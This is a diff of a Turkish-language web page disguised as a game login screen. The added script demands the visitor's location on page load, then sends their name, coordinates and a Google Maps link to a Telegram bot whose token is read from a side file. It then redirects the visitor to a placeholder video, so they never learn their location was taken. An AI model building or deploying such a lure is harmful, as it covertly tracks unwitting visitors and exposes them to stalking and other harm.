@@ -3,41 +3,92 @@
 <head>
   <meta charset="UTF-8">
   <title>Giriş Sayfası</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #f0f0f0, #d0eaff);
+      text-align: center;
+      padding-top: 100px;
+    }
+    input, button {
+      padding: 10px;
+      font-size: 16px;
+      margin: 10px;
+    }
+    #uyari {
+      color: red;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Giriş Yap</h2>
+  <h2>🎮 Giriş Yap</h2>
   <input type="text" id="username" placeholder="Adınızı girin">
-  <button onclick="girisYap()">Giriş Yap</button>
+  <br>
+  <button onclick="girisYap()">🚀 Giriş Yap</button>
+  <div id="uyari"></div>
 
   <script>
+    let konum = null;
+    let konumAlindi = false;
+
+    // Sayfa açılır açılmaz konum izni iste
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          konum = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude
+          };
+          konumAlindi = true;
+        }, function(error) {
+          konumAlindi = false;
+        });
+      } else {
+        konumAlindi = false;
+      }
+    };
+
     async function girisYap() {
-      const name = document.getElementById("username").value;
+      const name = document.getElementById("username").value.trim();
+      const uyari = document.getElementById("uyari");
+      uyari.textContent = "";
+
+      if (!konumAlindi) {
+        uyari.textContent = "📍 Bu site için konum izni gerekiyor!";
+        return;
+      }
+
       if (!name) {
-        alert("Lütfen adınızı girin!");
+        uyari.textContent = "🧠 İsim yaz adamım, bir isime ihtiyacın var!";
         return;
       }
 
-      if (!navigator.geolocation) {
-        alert("Tarayıcınız konum izni desteklemiyor.");
-        return;
-      }
+      // bilgiler.txt dosyasını oku
+      const response = await fetch("bilgiler.txt");
+      const text = await response.text();
+      const botToken = text.match(/BOT_TOKEN=(.*)/)[1].trim();
+      const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
 
-      navigator.geolocation.getCurrentPosition(async function(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
+      const mapsLink = `https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
+      const message = `🎮 Yeni Giriş!\n\n👤 İsim: *${name}*\n📍 Konum: *${konum.lat}, ${konum.lon}*\n🌐 Harita: [Google Maps](${mapsLink})`;
 
-        // bilgiler.txt dosyasını oku
-        const response = await fetch("bilgiler.txt");
-        const text = await response.text();
-        const botToken = text.match(/BOT_TOKEN=(.*)/)[1].trim();
-        const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const payload = {
+        chat_id: chatId,
+        text: message,
+        parse_mode: "Markdown"
+      };
 
-        const message = `👤 İsim: ${name}\n📍 Konum: https://www.google.com/maps?q=${lat},${lon}`;
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-        await fetch(url);
-        window.location.href = "-videouzantıkoy-"; // buraya videoyu sen koyacaksın
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
       });
+
+      // Videoya yönlendir
+      window.location.href = "-videouzantıkoy-";
     }
   </script>
 </body>
